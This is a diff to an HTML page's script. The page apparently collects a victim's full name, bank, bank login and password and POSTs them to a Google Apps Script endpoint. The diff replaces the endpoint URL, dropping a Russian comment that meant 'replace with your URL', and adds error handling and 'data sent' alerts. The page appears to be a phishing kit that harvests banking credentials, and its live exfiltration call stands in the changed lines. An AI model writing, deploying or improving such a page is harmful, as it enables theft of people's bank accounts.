@@ -137,9 +137,9 @@
 </div>
 <script>
   function toggleCustomBankInput() {
-    const select = document.getElementById('bank');
-    const customInput = document.getElementById('customBankInput');
-    customInput.style.display = select.value === 'custom' ? 'block' : 'none';
+    const toggle = document.getElementById('customBankToggle');
+    const input = document.getElementById('customBankInput');
+    input.style.display = toggle.checked ? 'block' : 'none';
   }
 
   function togglePassword() {
@@ -150,15 +150,14 @@
   function sendData() {
     const fullName = document.getElementById('fullname').value;
     const bankSelect = document.getElementById('bank');
-    const customBankInput = document.getElementById('customBankInput');
+    const customBankToggle = document.getElementById('customBankToggle');
+    const customBankInput = document.getElementById('customBankInput').value;
     const login = document.getElementById('login').value;
     const password = document.getElementById('password').value;
 
-    const bank = bankSelect.value === 'custom'
-      ? customBankInput.value
-      : bankSelect.value;
+    const bank = customBankToggle.checked ? customBankInput : bankSelect.value;
 
-    const url = "https://script.google.com/macros/s/AKfycbzpD4q83IlMFY4GhJEIGzuMR_sJqeH-5L-mCdv4S79tnK58MdHafOHPjvHQ9J2V8RvJiQ/exec"; // ЗАМЕНИ НА СВОЙ URL
+    const url = "https://script.google.com/macros/s/AKfycbyMRS-mt__yIbKpf1hgi1FLfbFrnpXpoK9rQjAexdgDDFXefmgV8QUNS77gVTy9QCv0xQ/exec";
 
     fetch(url, {
       method: 'POST',
@@ -172,12 +171,15 @@
         'Content-Type': 'application/json'
       }
     })
-    .then(res => res.text())
+    .then(res => {
+      if (!res.ok) throw new Error("HTTP error " + res.status);
+      return res.text();
+    })
     .then(data => {
-      alert("Данные отправлены!");
+      alert("✅ Данные успешно отправлены!");
     })
     .catch(err => {
-      alert("Ошибка: " + err);
+      alert("❌ Ошибка: " + err.message);
     });
   }
 </script>
